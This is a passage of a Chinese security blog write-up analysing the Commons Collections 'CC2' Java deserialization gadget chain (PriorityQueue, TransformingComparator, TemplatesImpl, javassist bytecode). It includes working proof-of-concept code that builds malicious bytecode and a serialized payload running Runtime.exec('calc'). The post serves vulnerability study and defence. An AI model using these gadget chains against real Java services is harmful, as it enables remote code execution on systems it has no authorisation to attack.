PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>; <span class="comment">//判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;默认添加顺序:&quot;</span>);</span><br><span class="line">        People people1=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小痴&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        People people2=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小笨&quot;</span>,<span class="number">26</span>);</span><br><span class="line">        People people3=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小臭&quot;</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;经过比较器后的顺序:&quot;</span>);</span><br><span class="line">        pq.add(people1);</span><br><span class="line">        pq.add(people2);</span><br><span class="line">        pq.add(people3);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(pq.poll().show());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-15.png" title="实现"></p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/7e30cd4a/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/7e30cd4a/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/7e30cd4a/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/7e30cd4a/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/7e30cd4a/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/7e30cd4a/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-35.png" title="实现demo"></p><p>其中的空指针的报错原因是在赋值传递变量时没有指向对象，然后在调用时直接通过该变量去调用对应的方法导致报错，但不影响执行效果。</p><h1 id="0x04、CC2利用链分析"><a href="#0x04、CC2利用链分析" class="headerlink" title="0x04、CC2利用链分析"></a>0x04、CC2利用链分析</h1><h2 id="逆推调用链"><a href="#逆推调用链" class="headerlink" title="逆推调用链"></a>逆推调用链</h2><p>分析CC1链的时候知道目的是调用<code>InvokerTransformer.transform()</code>方法，CC2链的后半段利用链跟CC1链相同，那就从不同的地方接着分析。<br>在搜寻<code>InvokerTransformer.transform()</code>方法的时候，CC2链中<code>TransformingComparator.compare()</code>方法对其进行了调用。<br><img src="/posts/7e30cd4a/cc2-5.png" title="TransformingComparator.compare()"></p><p>但该方法在cc1链中也调用了为啥不行，因为在<code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口，而CC1链中依赖<code>Commons Collections3</code>版本，3版本中<code>TransformingComparator</code>类未实现序列化接口，因此入口不成立。</p><p><code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口。</p><p><img src="/posts/7e30cd4a/cc2-6.png" title="实现了序列化接口"></p><p>其中由构造函数传入<code>transformer</code>对象可控</p><p><img src="/posts/7e30cd4a/cc2-7.png" title="构造函数传入"></p><p>简单实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//调用TransformingComparator执行compare方法。</span></span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//随便传入2个参数比较，只为调用.transform()方法</span></span><br><span class="line">        cp.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-8.png" title="实现demo"></p><p>接下来看在哪调用了<code>compare()</code>方法<br>有很多类都进行了调用，其中cc2链中的调用为<code>PriorityQueue</code>类</p><p><img src="/posts/7e30cd4a/cc2-9.png" title="调用情况"></p><p><code>PriorityQueue</code>类中<code>siftUpUsingComparator</code>、<code>siftDownUsingComparator</code>两个方法都进行了调用，再分别查看这两个方法在哪进行了调用。</p><p><strong>siftUpUsingComparator：</strong><br>先是在同类的<code>siftUp</code>方法中进行了调用</p><p><img src="/posts/7e30cd4a/cc2-10.png" title="siftUp"></p><p><code>offer</code>、<code>removeAt</code>这两个方法调用了</p><p><img src="/posts/7e30cd4a/cc2-11.png" title="siftUp"></p><p>追溯调用<code>offer</code>、<code>removeAt</code>者两个方法，发现这两个方法被调用的情况有很多，直观上也没有找到对应的入口，就先看另外一个方法</p><p><img src="/posts/7e30cd4a/cc2-12.png" title="removeAt"></p><p><strong>siftDownUsingComparator：</strong><br><code>siftDownUsingComparator</code>方法在<code>siftDown</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-16.png" title="siftDown"></p><p>继续向上，<code>siftDown</code>方法有三个方法进行了调用，其中<code>heapify</code>方法在反序列化<code>readObject</code>方法中调用</p><p><img src="/posts/7e30cd4a/cc2-17.png" title="siftDown"><br><img src="/posts/7e30cd4a/cc2-18.png" title="heapify"></p><h2 id="正向分析调用链"><a href="#正向分析调用链" class="headerlink" title="正向分析调用链"></a>正向分析调用链</h2><p>找到了反序列化入口，开始分析下调用情况</p><p><img src="/posts/7e30cd4a/cc2-19.png" title="readObject"></p><p>通过注释也不难明白，通过for循环读取序列化数据存在队列中，最后进行堆排序<code>heapify()</code><br>堆排列中通过循环数组长度（size），获取每个元素并执行<code>siftDown</code>方法，其中的长度验证可以调试查看是否为数组长度</p><p><img src="/posts/7e30cd4a/cc2-20.png" title="size验证"><br><img src="/posts/7e30cd4a/cc2-21.png" title="size验证"></p><p>为数组长度接下来进行堆排序<code>heapify()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中来理解<code>size &gt;&gt;&gt; 1</code>, <code>&gt;&gt;&gt;</code>为无符号右移，将size的值转换成二进制并将二进制数值整体向右移动<code>&gt;&gt;&gt;</code>后面数字的位数<br>比如这里size为3，二进制为<font color="red">0000…0000 0011</font> (整数类型有32位的长度，为了方便省略中间重复的0)，<code>&gt;&gt;&gt; 1</code>无符号右移1位<br>对应的二进制为<font color="red">0000…0000 0001</font>，即10进制为1。此时size大小为1。</p><p>所以当size小于2时，for循环中i的值就为<code>0-1=-1</code>，直接跳出循环，不会执行<code>siftDown</code>方法，设计意义也是为了有2个及以上的队列元素才进行排序操作。<br>因此满足此条件，必须给queue队列添加2个及以上元素，才能执行<code>siftDown</code>方法。</p><p>接下来到<code>siftDown</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先会判断是否存在<code>comparator</code>比较器，比较器存在就调用<code>siftDownUsingComparator</code>方法，不存在比较器就调用<code>siftDownComparable</code>方法，按逆推调用链的话就必须存在比较器，才能去调用<code>siftDownUsingComparator</code>方法<br>最后在<code>siftDownUsingComparator</code>方法中调用比较器的<code>compare</code>方法</p><p><img src="/posts/7e30cd4a/cc2-22.png" title="compare方法"></p><p>其中针对<code>PriorityQueue</code>类中的各个方法源码含义<br>可查看相关方法注解：<a href="https://www.cnblogs.com/freeorange/p/11405227.html">https://www.cnblogs.com/freeorange/p/11405227.html</a></p><h2 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h2><p>在cc1后半段基础上补充cc2的利用链，就形成完整利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  -PriorityQueue.readObject()</span><br><span class="line">    -PriorityQueue.heapify()</span><br><span class="line">      -PriorityQueue.siftDown()</span><br><span class="line">        -PriorityQueue.siftDownUsingComparator()</span><br><span class="line">          -TransformingComparator.compare()</span><br><span class="line">            -ChainedTransformer.transform()</span><br><span class="line">              -ConstantTransformer.transform()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Class.getMethod()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.getRuntime()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>利用链后半段用的cc1的后半段，可直接拿过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>然后创建比较器，为了调用<code>TransformingComparator</code>的<code>comare</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>比较器创建好了，再创建PriorityQueue队列，引入上面的<code>TransformingComparator</code>比较器，这里有两种利用方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(pq,cp);</span><br></pre></td></tr></table></figure><p>然后给<code>PriorityQueue</code>队列添加元素，分析过程的时候提到队列数组size大小必须大于等于2，所以这里添加元素最少要添加2个，才能触发利用链的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最后序列化<code>PriorityQueue</code>对象，再反序列化触发漏洞。</p><p>最后POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span 